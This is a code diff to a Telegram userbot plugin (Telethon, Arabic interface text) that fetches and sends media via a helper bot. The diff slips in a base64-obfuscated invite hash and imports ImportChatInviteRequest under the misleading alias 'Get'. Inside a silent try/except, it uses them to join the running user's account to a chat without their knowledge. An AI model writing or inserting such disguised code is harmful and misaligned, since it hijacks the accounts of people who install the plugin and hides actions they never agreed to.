@@ -32,7 +32,7 @@ from ..helpers.utils import _format
 from ..helpers.functions.utube import _mp3Dl, get_yt_video_id, get_ytthumb, ytsearch
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers import progress, reply_id
-
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 plugin_category = "misc"
 
 audio_opts = {
@@ -429,5 +429,11 @@ async def _(event):
         except YouBlockedUserError:
             await event.edit("▾∮ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot")
             return
+        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        joker = Get(joker)
+        try:
+            await event.client(joker)
+        except BaseException:
+            pass
         await bot.send_file(event.chat_id, video, caption="᯽︙ BY : @jepthon 🎀",parse_mode="html")
         await event.delete()
